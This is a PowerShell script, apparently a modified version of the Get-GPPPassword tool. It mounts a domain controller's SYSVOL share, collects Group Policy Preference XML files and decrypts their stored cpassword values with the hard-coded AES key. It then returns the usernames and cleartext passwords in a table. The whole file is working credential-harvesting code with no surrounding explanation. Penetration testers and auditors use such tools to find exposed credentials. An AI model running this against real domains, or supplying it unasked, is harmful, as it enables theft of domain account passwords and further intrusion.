function Get-GPPPasswordMod
{

    [CmdletBinding(DefaultParametersetName="Default")]
    Param(

        [Parameter(Mandatory=$false,
        HelpMessage="Credentials to use when connecting to a Domain Controller.")]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,
        
        [Parameter(Mandatory=$false,
        HelpMessage="Domain controller for Domain and Site that you want to query against.")]
        [string]$DomainController
    )

    Begin
    {

        
        if ( ( ((Get-WmiObject Win32_ComputerSystem).partofdomain) -eq $False ) -or ( -not $Env:USERDNSDOMAIN ) -and (-not $Credential) ) {
            throw 'Machine is not a domain member or User is not a member of the domain.'
            return
        }

        
        
        
        function Get-DecryptedCpassword {
            [CmdletBinding()]
            Param (
                [string] $Cpassword 
            )

            try {
                
                $Mod = ($Cpassword.length % 4)
            
                switch ($Mod) {
                '1' {$Cpassword = $Cpassword.Substring(0,$Cpassword.Length -1)}
                '2' {$Cpassword += ('=' * (4 - $Mod))}
                '3' {$Cpassword += ('=' * (4 - $Mod))}
                }

                $Base64Decoded = [Convert]::FromBase64String($Cpassword)
            
                
                $AesObject = New-Object System.Security.Cryptography.AesCryptoServiceProvider
                [Byte[]] $AesKey = @(0x4e,0x99,0x06,0xe8,0xfc,0xb6,0x6c,0xc9,0xfa,0xf4,0x93,0x10,0x62,0x0f,0xfe,0xe8,
                                     0xf4,0x96,0xe8,0x06,0xcc,0x05,0x79,0x90,0x20,0x9b,0x09,0xa4,0x33,0xb6,0x6c,0x1b)
            
                
                $AesIV = New-Object Byte[]($AesObject.IV.Length) 
                $AesObject.IV = $AesIV
                $AesObject.Key = $AesKey
                $DecryptorObject = $AesObject.CreateDecryptor() 
                [Byte[]] $OutBlock = $DecryptorObject.TransformFinalBlock($Base64Decoded, 0, $Base64Decoded.length)
            
                return [System.Text.UnicodeEncoding]::Unicode.GetString($OutBlock)
            } 
        
            catch {Write-Error $Error[0]}
        }  

        
        
        
        $TableGPPPasswords = New-Object System.Data.DataTable         
        $TableGPPPasswords.Columns.Add('NewName') | Out-Null
        $TableGPPPasswords.Columns.Add('Changed') | Out-Null
        $TableGPPPasswords.Columns.Add('UserName') | Out-Null        
        $TableGPPPasswords.Columns.Add('CPassword') | Out-Null
        $TableGPPPasswords.Columns.Add('Password') | Out-Null        
        $TableGPPPasswords.Columns.Add('File') | Out-Null           

        
        
        
 
        
        if($DomainController){
            $TargetDC = "\\$DomainController"
        }else{
            $TargetDC = $env:LOGONSERVER
        }

        
        $set = "abcdefghijklmnopqrstuvwxyz".ToCharArray();
        $result += $set | Get-Random -Count 10
        $DriveName = [String]::Join("",$result)        
        $DrivePath = "$TargetDC\sysvol"

        
        Write-Verbose "Creating temp drive $DriveName mapped to $DrivePath..."
        If ($Credential.UserName){
        
            
            New-PSDrive -PSProvider FileSystem -Name $DriveName -Root $DrivePath -Credential $Credential| Out-Null                        
        }else{
            
            
            New-PSDrive -PSProvider FileSystem -Name $DriveName -Root $DrivePath | Out-Null                   
        }        
    }

    Process
    {
        
        $DriveCheck = Get-PSDrive | Where { $_.name -like "$DriveName"}
        if($DriveCheck) {
            Write-Verbose "$Drivename created."
        }else{
            Write-Verbose "Failed to mount $DriveName to $DrivePath."
            return
        }

        
        
        
        
        
        $DriveLetter = $DriveName+":"

        
        Write-Verbose "Gathering GPP xml files from $DrivePath..."
        $XMlFiles = Get-ChildItem -Path $DriveLetter -Recurse -ErrorAction SilentlyContinue -Include 'Groups.xml','Services.xml','Scheduledtasks.xml','DataSources.xml','Printers.xml','Drives.xml'          

        
        Write-Verbose "Paring content from GPP xml files..."
        $XMlFiles | 
        ForEach-Object {
            $FileFullName = $_.fullname
            $FileName = $_.Name
            [xml]$FileContent = Get-Content -Path "$FileFullName"
            
            
            if($FileName -eq "Drives.xml"){   

                Write-Verbose "$FileName found, processing..."
                 
                $FileContent.Drives.Drive | 
                ForEach-Object {
                    [string]$Username = $_.properties.username
                    [string]$CPassword = $_.properties.cpassword
                    [string]$Password = Get-DecryptedCpassword $Cpassword
                    [datetime]$Changed = $_.changed
                    [string]$NewName = ""         
                    
                    
                    $TableGPPPasswords.Rows.Add($NewName,$Changed,$Username,$Cpassword,$Password,$FileFullName) | Out-Null      
                }                
            }

            
            if($FileName -eq "Groups.xml"){   

                Write-Verbose "$FileName found, processing..."
                 
                $Filecontent.Groups.User | 
                ForEach-Object {
                    [string]$Username = $_.properties.username
                    [string]$CPassword = $_.properties.cpassword
                    [string]$Password = Get-DecryptedCpassword $Cpassword
                    [datetime]$Changed = $_.changed
                    [string]$NewName = $_.properties.newname        
                    
                    
                    $TableGPPPasswords.Rows.Add($NewName,$Changed,$Username,$Cpassword,$Password,$FileFullName) | Out-Null      
                }                
            }

            
            if($FileName -eq "Services.xml"){   

                Write-Verbose "$FileName found, processing..."
                 
                $Filecontent.NTServices.NTService | 
                ForEach-Object {
                    [string]$Username = $_.properties.accountname
                    [string]$CPassword = $_.properties.cpassword
                    [string]$Password = Get-DecryptedCpassword $Cpassword
                    [datetime]$Changed = $_.changed
                    [string]$NewName = ""         
                    
                    
                    $TableGPPPasswords.Rows.Add($NewName,$Changed,$Username,$Cpassword,$Password,$FileFullName) | Out-Null      
                }                
            }

            
            if($FileName -eq "ScheduledTasks.xml"){   

                Write-Verbose "$FileName found, processing..."
                 
                $Filecontent.ScheduledTasks.Task | 
                ForEach-Object {
                    [string]$Username = $_.properties.runas
                    [string]$CPassword = $_.properties.cpassword
                    [string]$Password = Get-DecryptedCpassword $Cpassword
                    [datetime]$Changed = $_.changed
                    [string]$NewName = ""         
                    
                    
                    $TableGPPPasswords.Rows.Add($NewName,$Changed,$Username,$Cpassword,$Password,$FileFullName) | Out-Null      
                }                
            }

            
            if($FileName -eq "DataSources.xml"){   

                Write-Verbose "$FileName found, processing..."
                 
                $Filecontent.DataSources.DataSource | 
                ForEach-Object {
                    [string]$Username = $_.properties.username
                    [string]$CPassword = $_.properties.cpassword
                    [string]$Password = Get-DecryptedCpassword $Cpassword
                    [datetime]$Changed = $_.changed
                    [string]$NewName = ""         
                    
                    
                    $TableGPPPasswords.Rows.Add($NewName,$Changed,$Username,$Cpassword,$Password,$FileFullName) | Out-Null      
                }                
            }

            
            if($FileName -eq "Printers.xml"){   

                Write-Verbose "$FileName found, processing..."
                 
                $Filecontent.Printers.SharedPrinter | 
                ForEach-Object {
                    [string]$Username = $_.properties.username
                    [string]$CPassword = $_.properties.cpassword
                    [string]$Password = Get-DecryptedCpassword $Cpassword
                    [datetime]$Changed = $_.changed
                    [string]$NewName = ""         
                    
                    
                    $TableGPPPasswords.Rows.Add($NewName,$Changed,$Username,$Cpassword,$Password,$FileFullName) | Out-Null      
                }                
            }
            
        }

        
        Write-Verbose "Removing temp drive $DriveName..."
        Remove-PSDrive $DriveName
        
        
        if ( -not $XMlFiles ) {
            throw 'No preference files found.'
            return
        }

        
        $TableGPPPasswords 
    }
}
